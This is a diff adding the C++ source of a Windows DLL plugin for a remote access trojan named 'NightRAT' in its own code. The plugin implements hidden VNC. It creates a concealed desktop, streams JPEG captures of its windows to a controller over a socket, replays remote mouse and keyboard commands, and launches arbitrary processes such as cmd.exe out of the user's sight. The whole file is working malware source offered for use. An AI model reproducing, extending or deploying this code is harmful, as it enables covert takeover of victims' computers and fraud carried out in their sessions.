@@ -1,0 +1,483 @@
+#define WIN32_LEAN_AND_MEAN
+#include <winsock2.h>
+#include <windows.h>
+#include <propidl.h>
+#include <gdiplus.h>
+#include <objidl.h>
+#include <algorithm>
+#include <atomic>
+#include <cstdint>
+#include <cstring>
+#include <mutex>
+#include <string>
+#include <thread>
+#include <vector>
+#include <queue>
+#include <condition_variable>
+#include "../../include/json.hpp"
+
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "ole32.lib")
+
+using json = nlohmann::json;
+using namespace Gdiplus;
+using namespace std;
+
+#ifndef PW_RENDERFULLCONTENT
+#define PW_RENDERFULLCONTENT 0x00000002
+#endif
+
+#pragma pack(push, 1)
+struct PacketHeader {
+    uint16_t signature;
+    uint8_t type;
+    uint32_t size;
+};
+
+struct HVNCFrameHeader {
+    uint32_t monitor;
+    uint32_t scale;
+    uint32_t fps;
+    uint32_t width;
+    uint32_t height;
+    uint32_t format;
+    uint32_t dataSize;
+};
+#pragma pack(pop)
+
+static const uint16_t PACKET_SIGNATURE = 0x524E;
+static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
+static const uint32_t FRAME_FORMAT_JPEG = 1;
+
+static atomic_bool g_captureRunning(false);
+static thread g_captureThread;
+static mutex g_captureMutex;
+static mutex g_sendMutex;
+static SOCKET g_socket = INVALID_SOCKET;
+static int g_scalePercent = 50;
+static int g_targetFps = 20;
+
+static HDESK g_hHiddenDesktop = NULL;
+static wstring g_desktopName = L"NightRAT_HiddenDesktop";
+
+static mutex g_gdiplusMutex;
+static ULONG_PTR g_gdiplusToken = 0;
+
+// Input Worker
+struct InputTask {
+    string action;
+    json cmd;
+};
+static queue<InputTask> g_inputQueue;
+static mutex g_inputMutex;
+static condition_variable g_inputCV;
+static thread g_inputThread;
+static atomic_bool g_inputRunning(false);
+
+static bool safe_send_json(SOCKET sock, const json& data) {
+    if (sock == INVALID_SOCKET) return false;
+    lock_guard<mutex> lock(g_sendMutex);
+    string serialized = data.dump() + "\r\n";
+    const char* ptr = serialized.c_str();
+    int remaining = (int)serialized.size();
+    while (remaining > 0) {
+        int sent = send(sock, ptr, remaining, 0);
+        if (sent == SOCKET_ERROR || sent <= 0) return false;
+        ptr += sent;
+        remaining -= sent;
+    }
+    return true;
+}
+
+static void send_status(const string& msg) {
+    if (g_socket == INVALID_SOCKET) return;
+    json status;
+    status["action"] = "hvnc_status";
+    status["message"] = msg;
+    safe_send_json(g_socket, status);
+}
+
+static void send_error(const string& msg) {
+    if (g_socket == INVALID_SOCKET) return;
+    json err;
+    err["action"] = "hvnc_error";
+    err["message"] = msg;
+    safe_send_json(g_socket, err);
+}
+
+static bool safe_send_hvnc_frame(SOCKET sock, int scale, int fps, int width, int height, const vector<unsigned char>& jpegBytes) {
+    if (jpegBytes.empty() || sock == INVALID_SOCKET) return false;
+
+    HVNCFrameHeader frameHeader{};
+    frameHeader.monitor = 0;
+    frameHeader.scale = (uint32_t)scale;
+    frameHeader.fps = (uint32_t)fps;
+    frameHeader.width = (uint32_t)width;
+    frameHeader.height = (uint32_t)height;
+    frameHeader.format = FRAME_FORMAT_JPEG;
+    frameHeader.dataSize = (uint32_t)jpegBytes.size();
+
+    PacketHeader packetHeader{};
+    packetHeader.signature = PACKET_SIGNATURE;
+    packetHeader.type = PACKET_TYPE_HVNC_FRAME;
+    packetHeader.size = (uint32_t)(sizeof(HVNCFrameHeader) + jpegBytes.size());
+
+    vector<unsigned char> packet;
+    packet.resize(sizeof(PacketHeader) + packetHeader.size);
+    memcpy(packet.data(), &packetHeader, sizeof(PacketHeader));
+    memcpy(packet.data() + sizeof(PacketHeader), &frameHeader, sizeof(HVNCFrameHeader));
+    memcpy(packet.data() + sizeof(PacketHeader) + sizeof(HVNCFrameHeader), jpegBytes.data(), jpegBytes.size());
+
+    lock_guard<mutex> lock(g_sendMutex);
+    const char* ptr = (const char*)packet.data();
+    int remaining = (int)packet.size();
+    while (remaining > 0) {
+        int sent = send(sock, ptr, remaining, 0);
+        if (sent == SOCKET_ERROR || sent <= 0) return false;
+        ptr += sent;
+        remaining -= sent;
+    }
+    return true;
+}
+
+static bool ensure_gdiplus() {
+    lock_guard<mutex> lock(g_gdiplusMutex);
+    if (g_gdiplusToken != 0) return true;
+    GdiplusStartupInput input;
+    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
+}
+
+static void shutdown_gdiplus() {
+    lock_guard<mutex> lock(g_gdiplusMutex);
+    if (g_gdiplusToken != 0) {
+        GdiplusShutdown(g_gdiplusToken);
+        g_gdiplusToken = 0;
+    }
+}
+
+static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
+    UINT count = 0, size = 0;
+    GetImageEncodersSize(&count, &size);
+    if (size == 0) return -1;
+    vector<unsigned char> buffer(size);
+    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
+    if (GetImageEncoders(count, size, codecs) != Ok) return -1;
+    for (UINT i = 0; i < count; ++i) {
+        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
+            *clsid = codecs[i].Clsid;
+            return (int)i;
+        }
+    }
+    return -1;
+}
+
+static bool bitmap_to_jpeg(HBITMAP hBmp, ULONG quality, vector<unsigned char>& bytes) {
+    if (!ensure_gdiplus()) return false;
+    CLSID clsid;
+    if (get_encoder_clsid(L"image/jpeg", &clsid) < 0) return false;
+    Bitmap bmp(hBmp, NULL);
+    IStream* stream = NULL;
+    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) return false;
+    EncoderParameters params;
+    params.Count = 1;
+    params.Parameter[0].Guid = EncoderQuality;
+    params.Parameter[0].Type = EncoderParameterValueTypeLong;
+    params.Parameter[0].NumberOfValues = 1;
+    params.Parameter[0].Value = &quality;
+    if (bmp.Save(stream, &clsid, &params) != Ok) { stream->Release(); return false; }
+    STATSTG stat;
+    stream->Stat(&stat, STATFLAG_NONAME);
+    bytes.resize((size_t)stat.cbSize.QuadPart);
+    LARGE_INTEGER li = {0};
+    stream->Seek(li, STREAM_SEEK_SET, NULL);
+    ULONG read;
+    stream->Read(bytes.data(), (ULONG)bytes.size(), &read);
+    stream->Release();
+    return true;
+}
+
+static void ensure_desktop() {
+    if (g_hHiddenDesktop) return;
+    g_hHiddenDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
+    if (!g_hHiddenDesktop) {
+        g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
+    }
+}
+
+// Window compositing helper
+struct WindowInfo {
+    HWND hwnd;
+    RECT rect;
+};
+
+static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
+    if (!IsWindowVisible(hwnd)) return TRUE;
+    vector<WindowInfo>* windows = (vector<WindowInfo>*)lParam;
+    RECT rect;
+    if (GetWindowRect(hwnd, &rect)) {
+        windows->push_back({hwnd, rect});
+    }
+    return TRUE;
+}
+
+static void capture_loop() {
+    ensure_desktop();
+    if (!g_hHiddenDesktop) {
+        g_captureRunning = false;
+        return;
+    }
+
+    if (!SetThreadDesktop(g_hHiddenDesktop)) {
+        g_captureRunning = false;
+        return;
+    }
+
+    while (g_captureRunning) {
+        DWORD start = GetTickCount();
+        int scale, fps;
+        SOCKET s;
+        {
+            lock_guard<mutex> lock(g_captureMutex);
+            scale = g_scalePercent;
+            fps = g_targetFps;
+            s = g_socket;
+        }
+
+        int sw = GetSystemMetrics(SM_CXSCREEN);
+        int sh = GetSystemMetrics(SM_CYSCREEN);
+
+        HDC hdcScreen = GetDC(NULL);
+        HDC hdcMem = CreateCompatibleDC(hdcScreen);
+        HBITMAP hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
+        HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);
+
+        RECT fullRect = {0, 0, sw, sh};
+        HBRUSH hBrushBg = CreateSolidBrush(RGB(45, 45, 45));
+        FillRect(hdcMem, &fullRect, hBrushBg);
+        DeleteObject(hBrushBg);
+
+        vector<WindowInfo> windows;
+        EnumDesktopWindows(g_hHiddenDesktop, EnumWindowsProc, (LPARAM)&windows);
+        reverse(windows.begin(), windows.end());
+
+        for (const auto& win : windows) {
+            int ww = win.rect.right - win.rect.left;
+            int wh = win.rect.bottom - win.rect.top;
+            if (ww <= 0 || wh <= 0) continue;
+
+            HDC hdcWin = CreateCompatibleDC(hdcScreen);
+            HBITMAP hbmpWin = CreateCompatibleBitmap(hdcScreen, ww, wh);
+            HGDIOBJ hOldWin = SelectObject(hdcWin, hbmpWin);
+
+            if (!PrintWindow(win.hwnd, hdcWin, PW_RENDERFULLCONTENT)) {
+                HDC hdcRealWin = GetDC(win.hwnd);
+                if (hdcRealWin) {
+                    BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
+                    ReleaseDC(win.hwnd, hdcRealWin);
+                }
+            }
+            BitBlt(hdcMem, win.rect.left, win.rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
+
+            SelectObject(hdcWin, hOldWin);
+            DeleteObject(hbmpWin);
+            DeleteDC(hdcWin);
+        }
+
+        int dw = (sw * scale) / 100;
+        int dh = (sh * scale) / 100;
+        if (dw < 1) dw = 1; if (dh < 1) dh = 1;
+
+        HDC hdcFinal = CreateCompatibleDC(hdcScreen);
+        HBITMAP hbmpFinal = CreateCompatibleBitmap(hdcScreen, dw, dh);
+        HGDIOBJ hOldFinal = SelectObject(hdcFinal, hbmpFinal);
+        SetStretchBltMode(hdcFinal, HALFTONE);
+        StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);
+
+        vector<unsigned char> jpeg;
+        if (bitmap_to_jpeg(hbmpFinal, (ULONG)scale, jpeg)) {
+            safe_send_hvnc_frame(s, scale, fps, dw, dh, jpeg);
+        }
+
+        SelectObject(hdcFinal, hOldFinal);
+        DeleteObject(hbmpFinal);
+        DeleteDC(hdcFinal);
+        SelectObject(hdcMem, hOldMem);
+        DeleteObject(hbmpMem);
+        DeleteDC(hdcMem);
+        ReleaseDC(NULL, hdcScreen);
+
+        DWORD elapsed = GetTickCount() - start;
+        DWORD interval = 1000 / (fps > 0 ? fps : 1);
+        if (elapsed < interval) Sleep(interval - elapsed);
+    }
+}
+
+static void input_loop() {
+    ensure_desktop();
+    if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
+    if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }
+
+    while (g_inputRunning) {
+        InputTask task;
+        {
+            unique_lock<mutex> lock(g_inputMutex);
+            g_inputCV.wait(lock, [] { return !g_inputQueue.empty() || !g_inputRunning; });
+            if (!g_inputRunning && g_inputQueue.empty()) break;
+            task = g_inputQueue.front();
+            g_inputQueue.pop();
+        }
+
+        int sw = GetSystemMetrics(SM_CXSCREEN);
+        int sh = GetSystemMetrics(SM_CYSCREEN);
+
+        int x = (task.cmd.value("x", 0) * sw) / 65535;
+        int y = (task.cmd.value("y", 0) * sh) / 65535;
+        POINT pt = {x, y};
+
+        HWND hwnd = WindowFromPoint(pt);
+        if (!hwnd) continue;
+
+        if (task.action.find("hvnc_mouse") != string::npos) {
+            LRESULT hitTest = SendMessageW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(x, y));
+
+            if (task.action == "hvnc_mousemove") {
+                PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(x, y));
+                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(hitTest, WM_MOUSEMOVE));
+            } else if (task.action == "hvnc_mousedown" || task.action == "hvnc_mouseup") {
+                int btn = task.cmd.value("button", 0);
+                UINT msg = 0;
+                WPARAM wParam = 0;
+
+                if (task.action == "hvnc_mousedown") {
+                    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+                    SendMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(hitTest, WM_LBUTTONDOWN));
+                    SendMessageW(hRoot, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hRoot);
+                    SetForegroundWindow(hRoot);
+                    SetFocus(hwnd);
+
+                    if (hitTest != HTCLIENT) {
+                        msg = (btn == 0) ? WM_NCLBUTTONDOWN : (btn == 1 ? WM_NCRBUTTONDOWN : WM_NCMBUTTONDOWN);
+                        wParam = hitTest;
+                        PostMessageW(hwnd, msg, wParam, MAKELPARAM(x, y));
+                    } else {
+                        HWND hChild = ChildWindowFromPointEx(hwnd, pt, CWP_SKIPINVISIBLE);
+                        if (hChild && hChild != hwnd) hwnd = hChild;
+                        POINT clientPt = pt;
+                        ScreenToClient(hwnd, &clientPt);
+                        msg = (btn == 0) ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN);
+                        wParam = (btn == 0) ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON);
+                        PostMessageW(hwnd, msg, wParam, MAKELPARAM(clientPt.x, clientPt.y));
+                    }
+                } else {
+                    if (hitTest != HTCLIENT) {
+                        msg = (btn == 0) ? WM_NCLBUTTONUP : (btn == 1 ? WM_NCRBUTTONUP : WM_NCMBUTTONUP);
+                        wParam = hitTest;
+                        PostMessageW(hwnd, msg, wParam, MAKELPARAM(x, y));
+                    } else {
+                        HWND hChild = ChildWindowFromPointEx(hwnd, pt, CWP_SKIPINVISIBLE);
+                        if (hChild && hChild != hwnd) hwnd = hChild;
+                        POINT clientPt = pt;
+                        ScreenToClient(hwnd, &clientPt);
+                        msg = (btn == 0) ? WM_LBUTTONUP : (btn == 1 ? WM_RBUTTONUP : WM_MBUTTONUP);
+                        PostMessageW(hwnd, msg, 0, MAKELPARAM(clientPt.x, clientPt.y));
+                    }
+                }
+            }
+        } else if (task.action.find("hvnc_key") != string::npos) {
+            int vk = task.cmd.value("keycode", 0);
+            HWND hFocus = GetFocus();
+            if (!hFocus) hFocus = GetForegroundWindow();
+            if (!hFocus) hFocus = hwnd;
+
+            if (task.action == "hvnc_keydown") {
+                SendMessageW(hFocus, WM_KEYDOWN, vk, 0);
+                if ((vk >= 0x30 && vk <= 0x39) || (vk >= 0x41 && vk <= 0x5A) || vk == VK_SPACE || vk == VK_RETURN || vk == VK_BACK) {
+                    SendMessageW(hFocus, WM_CHAR, vk, 0);
+                }
+            } else {
+                SendMessageW(hFocus, WM_KEYUP, vk, 0);
+            }
+        }
+    }
+}
+
+static wstring utf8_to_wstring(const string& str) {
+    if (str.empty()) return wstring();
+    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
+    if (size <= 0) return wstring();
+    wstring res(size, 0);
+    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
+    if (res.back() == L'\0') res.pop_back();
+    return res;
+}
+
+extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
+    g_socket = sock;
+}
+
+extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
+    try {
+        json cmd = json::parse(cmdJson);
+        string action = cmd.value("action", "");
+        g_socket = sock;
+
+        if (action == "hvnc_start") {
+            g_scalePercent = cmd.value("quality", 50);
+            if (!g_captureRunning.exchange(true)) {
+                if (g_captureThread.joinable()) g_captureThread.join();
+                g_captureThread = thread(capture_loop);
+            }
+            if (!g_inputRunning.exchange(true)) {
+                if (g_inputThread.joinable()) g_inputThread.join();
+                g_inputThread = thread(input_loop);
+            }
+        } else if (action == "hvnc_stop") {
+            g_captureRunning = false;
+            g_inputRunning = false;
+            g_inputCV.notify_all();
+            if (g_captureThread.joinable()) g_captureThread.join();
+            if (g_inputThread.joinable()) g_inputThread.join();
+        } else if (action == "hvnc_quality") {
+            lock_guard<mutex> lock(g_captureMutex);
+            g_scalePercent = cmd.value("quality", 50);
+        } else if (action == "hvnc_run") {
+            ensure_desktop();
+            if (!g_hHiddenDesktop) return;
+
+            wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
+            vector<wchar_t> cmdLine(path.begin(), path.end());
+            cmdLine.push_back(L'\0');
+
+            STARTUPINFOW si = { sizeof(si) };
+            si.lpDesktop = (LPWSTR)g_desktopName.c_str();
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_SHOW;
+
+            PROCESS_INFORMATION pi = { 0 };
+            SetThreadDesktop(g_hHiddenDesktop);
+            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                send_status("Process started on hidden desktop");
+            } else {
+                send_error("Failed to start process. Error: " + to_string(GetLastError()));
+            }
+        } else if (action.find("hvnc_mouse") != string::npos || action.find("hvnc_key") != string::npos) {
+            lock_guard<mutex> lock(g_inputMutex);
+            g_inputQueue.push({action, cmd});
+            g_inputCV.notify_one();
+        }
+    } catch (...) {}
+}
+
+BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
+    if (reason == DLL_PROCESS_DETACH) {
+        g_captureRunning = false;
+        g_inputRunning = false;
+        g_inputCV.notify_all();
+    }
+    return TRUE;
+}
